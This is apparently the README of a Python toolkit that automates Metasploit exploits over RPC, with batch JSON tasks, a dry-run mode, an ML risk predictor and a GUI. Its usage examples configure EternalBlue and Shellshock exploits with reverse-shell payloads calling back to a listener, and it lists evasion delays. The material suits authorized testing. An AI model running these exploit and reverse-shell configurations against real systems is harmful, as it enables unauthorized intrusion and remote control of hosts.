# Advanced Penetration Testing Toolkit

## Scope
Automate and enhance exploit testing.

## Tools
- Python
- Metasploit

## Implementation
- Automate common attack patterns via Metasploit's RPC interface.
- Integrate stealth and evasion techniques such as random execution delays.
- Provide a CLI wrapper that can run single tasks or entire batches from JSON definitions.
- Support a `--dry-run` mode so workflows can be rehearsed or tested when Metasploit is unavailable.
- Include an optional machine learning module that can learn vulnerability severity from labeled datasets and make inline predictions.
- Offer a Tkinter-based graphical interface for analysts who prefer visual controls over the CLI.

## Challenges
- Keeping the toolkit updated with new exploits and modules
- Ethical and legal considerations; use only with explicit permission

## Usage

### Single task

```bash
python3 pentest_toolkit.py \
  --password <msfrpc-pass> \
  --task 10.10.10.5 exploit/windows/smb/ms17_010_eternalblue windows/x64/meterpreter/reverse_tcp \
  --option LHOST=10.10.14.2 --option LPORT=4444
```

### Batch execution

Create a JSON file containing one or more tasks:

```json
[
  {
    "target": "192.168.1.20",
    "exploit": "exploit/linux/http/apache_mod_cgi_bash_env_exec",
    "payload": "linux/x86/shell_reverse_tcp",
    "options": {"LHOST": "192.168.1.10", "LPORT": "4444"}
  }
]
```

Then invoke:

```bash
python3 pentest_toolkit.py --password <msfrpc-pass> --task-file tasks.json
```

Pass `--dry-run` to log the actions without touching Metasploit, which is useful for CI/CD validation or demonstrations.

## Machine Learning Threat Predictor
Supply a JSON dataset describing known environments so the toolkit can train a model that predicts how risky a new target may be.

```json
[
  {"open_ports": 4, "vuln_count": 2, "exposure_score": 0.35, "criticality": 0.4, "label": "medium"}
]
```

Each entry must include the four numeric features shown above plus a `label` of `low`, `medium`, or `high`. A sample dataset lives in `sample_dataset.json`.

Train and persist a model:

```bash
python3 pentest_toolkit.py --ml-dataset sample_dataset.json --ml-model threat_model.pkl
```

Generate inline predictions without touching Metasploit:

```bash
python3 pentest_toolkit.py \
  --ml-model threat_model.pkl \
  --ml-predict open_ports=6 \
  --ml-predict vuln_count=4 \
  --ml-predict exposure_score=0.7 \
  --ml-predict criticality=0.5
```

When scikit-learn is installed, the toolkit trains a RandomForest pipeline; otherwise it falls back to a heuristic severity model so the workflow always functions.

## Graphical User Interface
Launch the GUI to manage tasks, batch executions, and machine learning actions from a single dashboard:

```bash
python3 pentest_toolkit.py --gui --dry-run
```

The interface exposes panels for RPC connection settings, single/batch task execution, and the ML predictor (dataset selection, training, inline risk scoring). Dry-run mode is available directly in the GUI to make demos safer.

## Next Steps
- Expand the GUI with execution history persistence
- Add remote collaboration/synchronization hooks for team operations

## Resources
- https://docs.metasploit.com/
